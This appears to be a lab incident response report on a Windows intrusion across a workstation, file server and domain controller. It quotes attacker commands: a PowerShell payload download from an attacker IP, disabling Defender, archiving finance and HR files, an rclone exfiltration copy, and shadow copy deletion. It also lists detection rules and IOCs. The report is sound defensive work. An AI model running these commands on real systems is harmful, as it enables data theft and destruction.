# Incident Report: Multi-Stage Intrusion

---

## 1. Date of Report

```text
2026-04-21
```

---

## 2. Reported By

```text
Anton
```

---

## 3. Severity Level

```text
Critical
```

---

## 4. Executive Summary

A multi-stage intrusion was identified across `DESKTOP`, `FILES-SERVER`, and `DC01`.

The attack began when user `t.leon` on `DESKTOP` accessed the suspicious file-sharing domain `paste.sh` at 13:27. This was followed by hidden PowerShell execution that downloaded and launched `iexploreplugin.exe` from attacker-controlled infrastructure at `10.10.5.171:8883`.

After execution, the attacker established command-and-control communication, performed reconnaissance, deployed persistence using legitimate remote management tools, disabled Microsoft Defender real-time monitoring, accessed LSASS through a migrated process, and moved laterally using the account `admin143`.

On `FILES-SERVER`, the attacker staged additional payloads, established secondary command-and-control through `agegamepay.com`, compressed sensitive files, and used `rclone` to transfer a staged archive to remote storage.

The attacker later accessed `DC01`, downloaded scripts associated with impact preparation, modified Winlogon auto-logon registry values, deleted shadow copies, and downloaded a ransom-note-style file.

Overall, the intrusion demonstrated a full attack chain from initial access through execution, persistence, credential access, lateral movement, collection, exfiltration, and likely ransomware or destructive impact preparation.

---

## 5. Scope

This investigation covered the following systems and activity:

| System | Role | Relevance |
|---|---|---|
| `DESKTOP` | Workstation | Initial compromised host |
| `FILES-SERVER` | File server | Laterally accessed; data staged and exfiltrated |
| `DC01` | Domain controller | Laterally accessed; Staging observed |

Data sources reviewed included:

```text
Sysmon logs
Windows Security logs
PowerShell execution evidence
Browser history artefacts
Registry artefacts
Scheduled task artefacts
File creation events
DNS telemetry
Network connection telemetry
```

---

## 6. Attack Overview

The intrusion began with user interaction with a suspicious file-sharing site, leading to PowerShell-based payload delivery on `DESKTOP`.

The downloaded payload, `iexploreplugin.exe`, established outbound communication to `10.10.5.62:8080`, executed discovery commands, and was associated with process injection activity involving `notepad.exe` and `spoolsv.exe`.

The attacker established persistence using legitimate remote management tools, including Atera, Splashtop, and AnyDesk. Additional persistence was observed through scheduled tasks and script-based shortcut creation.

The attacker then disabled Microsoft Defender real-time monitoring and accessed LSASS through `spoolsv.exe`, supporting suspected credential access. Shortly after this, the account `admin143` was used for lateral movement to `FILES-SERVER` and later `DC01`.

On `FILES-SERVER`, the attacker downloaded and extracted `python.zip`, executed `testc.exe`, dropped `ws2_32.exe` and `system_module.exe`, and established secondary C2 through `agegamepay.com`. Sensitive files were compressed into `teams-skartech.zip` and transferred using `rclone`.

On `DC01`, the attacker downloaded `crypto.psm1`, `script.ps1`, and `dhsf82.bat`, modified Winlogon auto-logon registry values, deleted shadow copies, and downloaded `Recover-Files.txt`, indicating likely ransomware or destructive impact preparation.

---

## 7. Key Findings

### 7.1 Initial Access

Initial access was linked to:

```text
paste.sh
```

User:

```text
t.leon
```

Host:

```text
DESKTOP
```

Timestamp:

```text
2025-08-25 13:27:40
```

The URL visit was confirmed through DNS telemetry and browser history artefacts.

<img width="1300" height="600" alt="image" src="https://github.com/user-attachments/assets/67f6412c-688e-452a-b672-434512f162ac" />

--- 

<img width="1300" height="600" alt="image" src="https://github.com/user-attachments/assets/b73b9e70-a05f-43a3-b1bf-4671c9c24fa1" />


---

### 7.2 Payload Execution

Hidden PowerShell downloaded and executed:

```text
iexploreplugin.exe
```

Payload source:

```text
http://10.10.5.171:8883/iexploreplugin.exe
```

<img width="1803" height="785" alt="image" src="https://github.com/user-attachments/assets/e0054d0f-6756-47ac-bb3f-15a46c04bb77" />

<img width="2048" height="812" alt="image" src="https://github.com/user-attachments/assets/e40185e7-98f5-4a92-b3a6-de269728205d" />


---

### 7.3 Initial Command and Control

Initial C2 communication was observed to:

```text
10.10.5.62:8080
```

This IP later appeared as the source of lateral movement activity, increasing its significance.

<img width="2048" height="715" alt="image" src="https://github.com/user-attachments/assets/e5a90109-0a36-4937-b427-286cc36e76f8" />

---

### 7.4 Reconnaissance

Reconnaissance commands included:

```text
cmdkey /list
net view \\coretech.lab\SYSVOL
ping -n 1 DC01
net user /domain
net group "Domain Admins" /domain
net localgroup administrators
whoami /all
tasklist
```

These commands indicate stored credential discovery, domain user discovery, privileged group discovery, process discovery, and domain resource enumeration.

<img width="2048" height="918" alt="image" src="https://github.com/user-attachments/assets/51002088-7928-4a06-aa22-d427b6fad18b" />


---

### 7.5 Process Injection and Enumeration Output

`iexploreplugin.exe` showed CreateRemoteThread activity involving:

```text
notepad.exe
spoolsv.exe
```

`notepad.exe` was later associated with BloodHound-style enumeration output:

```text
20250825133552_BloodHound.zip
```

<img width="2048" height="913" alt="image" src="https://github.com/user-attachments/assets/98d817a7-e73f-42db-9b99-b10b2975a2de" />

---

<img width="2549" height="1142" alt="image" src="https://github.com/user-attachments/assets/1cbe3db9-824b-4ed1-ae00-0fe5a99730e1" />


---

### 7.6 Persistence

Persistence was established through legitimate remote management tools and scheduled task/script mechanisms.

Remote management tools observed:

```text
AteraAgent
SplashtopRemoteService
AnyDesk
```

Atera-related values:

```text
IntegratorLogin=bunionsneaker.4m@gmail.com
AccountId=001Q300000VzBKuIAN
```

Scheduled tasks observed:

```text
Monitoring Recovery
AteraAgentServiceWatchdog
```

Script/shortcut persistence:

```text
scvhost.vbs
iexplorer.lnk
```

<img width="2048" height="806" alt="image" src="https://github.com/user-attachments/assets/87a22000-6ede-4d65-bf27-46f8cb233e02" />

---

<img width="2048" height="810" alt="image" src="https://github.com/user-attachments/assets/6655e397-04cf-4615-b56b-cb5e204580ea" />

---

<img width="2048" height="924" alt="image" src="https://github.com/user-attachments/assets/fc480c13-c921-420a-a377-98ae5baa5a21" />

---

<img width="2535" height="1004" alt="image" src="https://github.com/user-attachments/assets/f20bc3f2-5748-4963-8925-1fd10f7e6c0b" />


---

### 7.7 Defence Evasion

The attacker disabled Microsoft Defender real-time monitoring using hidden PowerShell.

Command observed:

```text
powershell.exe -WindowStyle Hidden -Command Set-MpPreference -DisableRealtimeMonitoring
```

Timestamp:

```text
2025-08-25 13:53:39
```


<img width="2048" height="722" alt="image" src="https://github.com/user-attachments/assets/4a4fead4-0475-4598-9abc-65643d0795cf" />


---

### 7.8 Credential Access

Credential access activity was observed through LSASS access.

Key sequence:

```text
2025-08-25 13:55:22 - iexploreplugin.exe accessed spoolsv.exe
2025-08-25 13:56:54 - spoolsv.exe accessed lsass.exe
```

This supports suspected credential access through a migrated process. Credential dumping should not be considered fully confirmed unless dumped hashes, credential output, or tool-specific artefacts are recovered.

<img width="2048" height="808" alt="image" src="https://github.com/user-attachments/assets/c42194ad-265f-4b8a-bbeb-a58f4caf54ea" />


---

### 7.9 Lateral Movement

Lateral movement to `FILES-SERVER` used:

```text
admin143
```

Source IP:

```text
10.10.5.62
```

FILES-SERVER logon:

```text
2025-08-25 13:58:52 - admin143 Logon Type 3 from 10.10.5.62
```

Immediate command execution:

```text
2025-08-25 13:58:53 - whoami executed on FILES-SERVER
```

Later DC01 logon:

```text
2025-08-25 14:34:30 - admin143 Logon Type 3 from 10.10.5.62
```

<img width="2048" height="914" alt="image" src="https://github.com/user-attachments/assets/7f0962b7-f56a-4bdb-8b83-171057ebdf54" />

--- 

<img width="2048" height="812" alt="image" src="https://github.com/user-attachments/assets/43a55c6e-2c19-4415-877f-f6206ac8215d" />

---

<img width="2048" height="919" alt="image" src="https://github.com/user-attachments/assets/8419e3b6-6a97-4be8-b6da-909afcbb6ef8" />


---

### 7.10 Payload Staging on FILES-SERVER

After lateral movement, the attacker downloaded:

```text
python.zip
```

Download command:

```text
powershell -c iwr -uri http://10.10.5.171:8883/python.zip -outfile C:\Users\admin143\Downloads\python.zip
```

Extracted files included:

```text
testc.exe
python311.dll
```

<img width="2048" height="670" alt="image" src="https://github.com/user-attachments/assets/ff478d2e-225f-4efa-b65d-23ae54f39a43" />


---

### 7.11 Secondary Payload Execution

`testc.exe` created:

```text
ws2_32.exe
system_module.exe
```

`testc.exe` also loaded:

```text
python311.dll
urlmon.dll
```

This supports suspected DLL-based payload execution or possible DLL side-loading.

<img width="2048" height="916" alt="image" src="https://github.com/user-attachments/assets/5699c4ba-36ef-456f-823a-84d965466e6c" />

---

<img width="2048" height="919" alt="image" src="https://github.com/user-attachments/assets/ca06d686-ca48-47e6-8ecd-03a8935ec8d5" />


---

### 7.12 Secondary Command and Control

`ws2_32.exe` queried:

```text
agegamepay.com
```

Resolved IP:

```text
10.10.5.245
```

Network connections:

```text
ws2_32.exe        -> 10.10.5.245:8443
system_module.exe -> 10.10.5.245:8083
```

<img width="2048" height="916" alt="image" src="https://github.com/user-attachments/assets/2e149ebe-a80f-4328-83f1-3094c3ccb83e" />

---

<img width="2048" height="610" alt="image" src="https://github.com/user-attachments/assets/b8d8e2e4-e74f-4274-9b3d-07346e70c2f9" />


---

### 7.13 Collection

Sensitive files were compressed into a staging archive.

Command observed:

```text
powershell -c "Compress-Archive -Path 'C:\Shares\Shares\Finance.csv','C:\Shares\Shares\HR.csv' -DestinationPath 'C:\ProgramData\Teams\teams-skartech.zip'"
```

Files collected:

```text
Finance.csv
HR.csv
```

Archive created:

```text
C:\ProgramData\Teams\teams-skartech.zip
```

<img width="1187" height="281" alt="image" src="https://github.com/user-attachments/assets/27ec7fea-8c8a-4394-a34c-552ee045f54b" />


---

### 7.14 Exfiltration

The attacker used `rclone` to transfer the staged archive to remote storage.

Rclone setup:

```text
powershell -Command "Expand-Archive -Path 'C:\ProgramData\teams\rclone+config.zip' -DestinationPath 'C:\ProgramData\teams\rclone' -Force"
```

Exfiltration command:

```text
cmd.exe /c "C:\ProgramData\Teams\rclone\rclone-v1.71.0-windows-amd64\rclone.exe copy teams-starktech.zip remote:starktech-backups"
```

Remote destination:

```text
remote:starktech-backups
```

Timestamp:

```text
2025-08-25 14:25:03
```

<img width="2047" height="918" alt="image" src="https://github.com/user-attachments/assets/ded104f4-1ff0-450b-a39e-1743bcdac3c2" />


---

### 7.15 DC01 Impact Preparation

After lateral movement to `DC01`, the attacker downloaded scripts associated with impact preparation.

Downloads observed:

```text
2025-08-25 14:36:51 - crypto.psm1 downloaded to C:\ProgramData\crypto.psm1
2025-08-25 14:37:57 - script.ps1 downloaded to C:\ProgramData\script.ps1
2025-08-25 14:44:11 - dhsf82.bat downloaded to C:\ProgramData\Microsoft\dhsf82.bat
```

Winlogon auto-logon registry values modified:

```text
AutoAdminLogon = 1
DefaultUserName = Main\william
DefaultPassword = CyberNight!128
```

Additional impact preparation indicators:

```text
vssadmin delete shadows /all /quiet
Recover-Files.txt
```


**Screenshot should show:**

```text
crypto.psm1
script.ps1
dhsf82.bat
certutil
14:36:51
14:37:57
14:44:11
```

**Insert screenshot here:**

```markdown
![DC01 Impact Preparation - Winlogon Registry Modification](./screenshots/23-dc01-winlogon-registry.png)
```

**Screenshot should show:**

```text
AutoAdminLogon
DefaultUserName
DefaultPassword
CyberNight!128
14:46:02
```


```markdown
![DC01 Impact Preparation - Shadow Copy Deletion and Ransom Note](./screenshots/24-dc01-shadowcopy-ransomnote.png)
```

**Screenshot should show:**

```text
vssadmin delete shadows /all /quiet
Recover-Files.txt
```

---

## 8. Investigation Timeline

| Time | Host | Event | Significance |
|---|---|---|---|
| 2025-08-25 13:27:40 | `DESKTOP` | `t.leon` accessed `paste.sh` | Initial suspicious URL access |
| ~13:30 | `DESKTOP` | PowerShell downloaded `iexploreplugin.exe` | Payload delivery |
| ~13:30 | `DESKTOP` | `iexploreplugin.exe` connected to `10.10.5.62:8080` | Initial C2 |
| ~13:35 | `DESKTOP` | `20250825133552_BloodHound.zip` created | AD enumeration output |
| ~13:45 | `DESKTOP` | Atera installed | RMM persistence |
| 2025-08-25 13:47:10 | `DESKTOP` | `Monitoring Recovery` task created | Scheduled task persistence |
| 2025-08-25 13:51:18 | `DESKTOP` | `AteraAgentServiceWatchdog` task created | Scheduled task persistence |
| 2025-08-25 13:52:25 | `DESKTOP` | `scvhost.vbs` created `iexplorer.lnk` | Shortcut persistence |
| 2025-08-25 13:53:40 | `DESKTOP` | Defender real-time monitoring disabled | Defence evasion |
| 2025-08-25 13:56:54 | `DESKTOP` | `spoolsv.exe` accessed `lsass.exe` | Suspected credential access |
| 2025-08-25 13:58:52 | `FILES-SERVER` | `admin143` Logon Type 3 from `10.10.5.62` | Lateral movement |
| 2025-08-25 13:58:53 | `FILES-SERVER` | `whoami` executed | Post-logon validation |
| 2025-08-25 14:00:33 | `FILES-SERVER` | `python.zip` downloaded | Payload staging |
| 2025-08-25 14:03:51 | `FILES-SERVER` | `testc.exe` created `ws2_32.exe` | Secondary payload |
| 2025-08-25 14:05:06 | `FILES-SERVER` | `ws2_32.exe` queried `agegamepay.com` | Secondary C2 |
| 2025-08-25 14:17:04 | `FILES-SERVER` | `Finance.csv` and `HR.csv` compressed | Collection |
| 2025-08-25 14:25:03 | `FILES-SERVER` | `rclone` copied archive to remote storage | Exfiltration |
| 2025-08-25 14:34:30 | `DC01` | `admin143` Logon Type 3 from `10.10.5.62` | Lateral movement to domain controller |
| 2025-08-25 14:36:51 | `DC01` | `crypto.psm1` downloaded | Impact preparation |
| 2025-08-25 14:37:57 | `DC01` | `script.ps1` downloaded | Impact preparation |
| 2025-08-25 14:46:02 | `DC01` | Winlogon auto-logon modified | Persistence / impact preparation |
| Later | `DC01` | Shadow copies deleted | Recovery inhibition |
| Later | `DC01` | `Recover-Files.txt` downloaded | Ransom note indicator |

---

## 9. Who, What, When, Where, Why, How

### Who

User `t.leon` was associated with the initial compromised workstation activity on `DESKTOP`.

The attacker later used:

```text
admin143
```

for lateral movement.

Persistence tooling was linked to:

```text
bunionsneaker.4m@gmail.com
AccountId=001Q300000VzBKuIAN
```

---

### What

A multi-stage intrusion involving:

```text
malicious URL access
PowerShell payload execution
command-and-control
reconnaissance
RMM persistence
scheduled task persistence
shortcut/script persistence
Defender tampering
suspected credential access
lateral movement
payload staging
secondary C2
data collection
rclone exfiltration
DC01 impact preparation
```

---

### When

Primary malicious activity occurred on:

```text
2025-08-25
```

The activity began at approximately:

```text
13:27:40
```

and continued across multiple hosts through the afternoon.

---

### Where

The intrusion affected:

```text
DESKTOP
FILES-SERVER
DC01
```

---

### Why

Based on the observed reconnaissance, credential access, lateral movement, exfiltration staging, and download of encryption-related scripts, the attacker’s likely objective was to expand control, remove sensitive data, and prepare for disruptive or destructive impact.

This is an inference based on the observed attack chain.

---

### How

The attacker used:

```text
malicious file-sharing URL
hidden PowerShell execution
staged executables and archives
remote management software
scheduled tasks
script and shortcut persistence
registry changes
Defender tampering
process injection
LSASS access
valid account lateral movement
archive compression
rclone-based cloud transfer
certutil-based script retrieval
shadow copy deletion
```

---

## 10. MITRE ATT&CK Techniques

| Technique ID | Technique | Evidence |
|---|---|---|
| T1059.001 | PowerShell | PowerShell downloaded and executed `iexploreplugin.exe` |
| T1105 | Ingress Tool Transfer | Payloads downloaded from `10.10.5.171:8883` |
| T1219 | Remote Access Software | Atera, Splashtop, AnyDesk |
| T1053.005 | Scheduled Task | `Monitoring Recovery`, `AteraAgentServiceWatchdog` |
| T1547.009 | Shortcut Modification | `scvhost.vbs` created `iexplorer.lnk` |
| T1112 | Modify Registry | Winlogon auto-logon registry changes |
| T1087.002 | Domain Account Discovery | `net user /domain` |
| T1069.002 | Domain Groups | `net group "Domain Admins" /domain` |
| T1003.001 | LSASS Memory | `spoolsv.exe` accessed `lsass.exe` |
| T1021.002 | SMB / Windows Admin Shares context | Logon Type 3 lateral movement |
| T1560.001 | Archive Collected Data | `Compress-Archive` created `teams-skartech.zip` |
| T1567 | Exfiltration to Cloud Storage | `rclone` copied archive to remote storage |
| T1490 | Inhibit System Recovery | `vssadmin delete shadows /all /quiet` |

---

## 11. Impact Assessment

The intrusion reached multiple systems, including a file server and domain controller, significantly increasing the overall severity.

Persistence was established through several overlapping methods, including legitimate remote administration software, scheduled tasks, and script/shortcut artefacts.

Credential access activity was observed through LSASS access by `spoolsv.exe`, and lateral movement was confirmed using valid credentials. Sensitive files on the file server were compressed and staged for exfiltration, and `rclone` was used to transfer the archive to remote storage.

Encryption-related scripts were later downloaded to the domain controller, and shadow copies were deleted. This indicates the attack had progressed beyond simple access and posed serious risk of operational disruption, data loss, and broader domain compromise.

Potential impacts include:

```text
unauthorised access to sensitive data
possible data exfiltration
domain compromise
persistence through remote access tools
credential compromise
operational disruption
ransomware preparation
reduced recovery capability due to shadow copy deletion
```

---

## 12. Recommendations 

### 12.1 Immediate Reactive Actions

```text
Isolate DESKTOP, FILES-SERVER, and DC01 from the network.
Disable or reset t.leon and admin143.
Reset credentials for any account authenticated from 10.10.5.62.
Preserve disk and memory evidence before rebuilding systems.
Block known malicious IPs, domains, and file hashes where available.
Remove unauthorised RMM tools from affected systems.
Review DC01 immediately for persistence and impact activity.
```

---

### 12.2 IOC-Based Reactive Recommendations

Use the following IOCs to search, block, and contain currently affected systems.

| IOC | Type | Reactive Action |
|---|---|---|
| `paste.sh` | Domain | Review proxy/DNS logs for access; block if not business-approved |
| `10.10.5.171:8883` | IP:Port | Block; search for payload downloads |
| `10.10.5.62:8080` | IP:Port | Block; investigate systems communicating with it |
| `10.10.5.245` | IP | Block; review connections to ports `8443` and `8083` |
| `agegamepay.com` | Domain | Block; search DNS logs for queries |
| `iexploreplugin.exe` | File | Quarantine; search across endpoints |
| `python.zip` | File | Quarantine; identify extraction activity |
| `testc.exe` | File | Quarantine; search for execution |
| `ws2_32.exe` | File | Quarantine; search for DNS/C2 activity |
| `system_module.exe` | File | Quarantine; search for network activity |
| `python311.dll` | DLL | Review path and loading process |
| `teams-skartech.zip` | Archive | Locate and preserve; identify contents |
| `rclone.exe` | Tool | Search for execution and config files |
| `remote:starktech-backups` | Remote path | Investigate exfiltration destination |
| `crypto.psm1` | Script | Remove after preserving evidence |
| `script.ps1` | Script | Remove after preserving evidence |
| `dhsf82.bat` | Script | Remove after preserving evidence |
| `Recover-Files.txt` | File | Preserve; review contents |
| `CyberNight!128` | Password value | Treat as compromised; remove from registry and rotate related accounts |

---

### 12.3 Proactive Recommendations

Use the following recommendations to reduce future risk from similar indicators and behaviours.

| IOC / Behaviour | Proactive Control |
|---|---|
| File-sharing sites such as `paste.sh` | Monitor or restrict paste/file-sharing domains unless business-approved |
| PowerShell web downloads | Alert on `Invoke-WebRequest`, `iwr`, `DownloadString`, and encoded PowerShell |
| Payload downloads from non-standard ports | Alert on executable downloads over unusual ports such as `8883` |
| RMM tools | Maintain an approved RMM allowlist; alert on new installs of Atera, AnyDesk, Splashtop |
| Event ID 4697 service creation | Alert when new remote access services are installed |
| Event ID 4698 scheduled task creation | Alert on suspicious scheduled task creation or unusual task names |
| Shortcut/script persistence | Hunt for `.vbs`, `.lnk`, and `cscript.exe` activity in user profiles |
| Defender tampering | Alert on `Set-MpPreference -DisableRealtimeMonitoring` |
| LSASS access | Alert on non-standard processes accessing `lsass.exe` |
| Process injection | Alert on Event ID 8 involving unusual source/target process pairs |
| BloodHound-style output | Alert on files matching `*BloodHound*.zip` or AD enumeration outputs |
| Suspicious DLL loading | Alert when executables load DLLs from user-writable folders |
| Archive staging | Alert on `Compress-Archive` targeting sensitive shares |
| `rclone` execution | Block or alert on unapproved cloud sync tooling |
| `certutil` downloads | Alert on `certutil -urlcache -split -f` download patterns |
| Winlogon auto-logon | Monitor `AutoAdminLogon`, `DefaultUserName`, and `DefaultPassword` registry changes |
| Shadow copy deletion | Alert on `vssadmin delete shadows /all /quiet` |
| Ransom-note-style files | Monitor creation/download of files such as `Recover-Files.txt` |

---

### 12.4 Eradication Actions

Remove attacker-installed persistence mechanisms:

```text
AteraAgent
SplashtopRemoteService
AnyDesk
Monitoring Recovery
AteraAgentServiceWatchdog
scvhost.vbs
iexplorer.lnk
dhsf82.bat
```

Reverse malicious Winlogon registry modifications on `DC01`:

```text
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

Review and remove:

```text
AutoAdminLogon = 1
DefaultUserName = Main\william
DefaultPassword = CyberNight!128
```

Delete or quarantine staged attacker files after evidence preservation:

```text
iexploreplugin.exe
python.zip
testc.exe
python311.dll
ws2_32.exe
system_module.exe
teams-skartech.zip
rclone+config.zip
crypto.psm1
script.ps1
Recover-Files.txt
```

---

### 12.5 Recovery Actions

```text
Rebuild or restore affected hosts from known-good backups.
Validate backup integrity before restoration.
Rotate credentials for impacted users and administrators.
Review Domain Admins and privileged group membership.
Re-enable Microsoft Defender real-time monitoring.
Confirm shadow copy status and backup availability.
Validate that no unauthorised scheduled tasks or services remain.
Monitor for reappearance of IOCs.
Conduct a domain-wide hunt for related payloads and persistence mechanisms.
```

---

## 13. Evidence

Evidence supporting this report includes:

```text
DNS telemetry showing paste.sh and agegamepay.com
Browser history confirming paste.sh visit
PowerShell execution showing payload downloads
Sysmon process creation events
Sysmon network connection events
Sysmon file creation events
Sysmon image load events
Sysmon ProcessAccess events involving LSASS
Windows Security logon events
Service creation events
Scheduled task artefacts
Registry artefacts
rclone execution evidence
DC01 script download and registry modification evidence
```

---

## 14. Report Status

```text
Draft / Investigation Completed
```

Further validation recommended:

```text
Confirm whether credential dumping output was recovered.
Confirm whether encryption executed or only impact preparation occurred.
Confirm the full contents of teams-skartech.zip.
Confirm whether rclone transfer completed successfully.
Confirm whether additional hosts communicated with the identified infrastructure.
```
